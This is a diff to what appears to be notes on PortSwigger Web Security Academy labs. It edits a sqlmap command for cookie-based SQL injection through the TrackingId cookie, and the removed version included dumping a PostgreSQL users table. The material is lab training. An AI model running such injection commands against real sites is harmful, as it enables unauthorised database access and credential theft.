@@ -2869,7 +2869,7 @@ sudo sqlmap -u 'https://0af7006b04464bd581c17078008200aa.web-security-academy.ne
 2. Cookie injection:
 
 ```
-sudo sqlmap -u 'https://0ab100de04e9e4a58031307800c600e6.web-security-academy.net/filter?category=Pets \
+sudo sqlmap -u 'https://0ab100de04e9e4a58031307800c600e6.web-security-academy.net/filter?category=Pets' \
   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
   -H 'accept-language: en-US,en;q=0.9' \
   -H 'cookie: TrackingId=TEaLoCAHZS25Ps7h; session=Mn2mKUuqpaCVXE9iNoXUQEnUaTRQJByV' \
@@ -2884,7 +2884,7 @@ sudo sqlmap -u 'https://0ab100de04e9e4a58031307800c600e6.web-security-academy.ne
   -H 'sec-fetch-user: ?1' \
   -H 'upgrade-insecure-requests: 1' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36' \
-  --cookie='TrackingId=*; session=Mn2mKUuqpaCVXE9iNoXUQEnUaTRQJByV' -p 'TrackingId' --param-filter='COOKIE' --skip='session' --level 2 [--dbms postgresql -D public -T users --dump]
+  --cookie='TrackingId=TEaLoCAHZS25Ps7h; session=Mn2mKUuqpaCVXE9iNoXUQEnUaTRQJByV' -p 'TrackingId' --level 2 --flush-session
 ```
 
 -----
